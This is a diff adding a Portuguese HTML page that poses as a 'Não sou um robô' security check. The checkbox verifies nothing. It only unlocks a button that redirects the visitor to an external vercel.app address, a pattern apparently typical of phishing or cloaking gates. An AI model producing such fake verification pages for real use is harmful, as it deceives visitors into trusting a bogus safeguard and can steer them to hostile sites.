@@ -1,0 +1,114 @@
+<html lang="pt-BR"><head><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação de Segurança</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .box {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 6px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .checkbox-area {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: 1px solid #ccc;
+      padding: 15px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      opacity: 0.6;
+    }
+
+    button.active {
+      opacity: 1;
+    }
+
+    .small {
+      font-size: 12px;
+      color: #999;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body cz-shortcut-listen="true">
+
+  <div class="box">
+    <h1>Confirmação de Segurança</h1>
+    <p>Verifique abaixo para continuar</p>
+
+    <div class="checkbox-area">
+      <input type="checkbox" id="check">
+      <label for="check">Não sou um robô</label>
+    </div>
+
+    <button id="btn" disabled="">Continuar</button>
+
+    <div class="small">
+      Essa verificação ajuda a proteger nosso sistema.
+    </div>
+  </div>
+
+  <script>
+    const check = document.getElementById('check');
+    const btn = document.getElementById('btn');
+
+    check.addEventListener('change', () => {
+      if (check.checked) {
+        btn.disabled = false;
+        btn.classList.add('active');
+      } else {
+        btn.disabled = true;
+        btn.classList.remove('active');
+      }
+    });
+
+    btn.addEventListener('click', () => {
+      window.location.href = "https://natural02.vercel.app/";
+    });
+  </script>
+
+
+
+</body></html>
